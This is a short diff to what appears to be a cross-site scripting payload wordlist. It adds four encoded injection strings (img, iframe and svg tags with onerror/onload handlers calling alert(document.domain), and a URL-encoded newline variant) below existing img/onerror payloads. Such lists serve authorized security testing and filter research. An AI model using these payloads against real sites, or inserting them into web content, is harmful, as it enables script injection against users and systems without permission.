@@ -460,3 +460,7 @@ a"onmouseover="alert(216)"
 <img/”onerror=alert(1) src=a>
 <img/’onerror=alert(1) src=a>
 <img/anyjunk/onerror=alert(1) src=a>
+‘\u003cimg src=xonerror=‘alert(document.domain)’\u003e’ 
+\u003ciframe/onload=src=\"javascript:alert(1)\"\u003e
+%250aalert(document.domain)
+\u003csvg/onload=alert(document.domain)\u003e
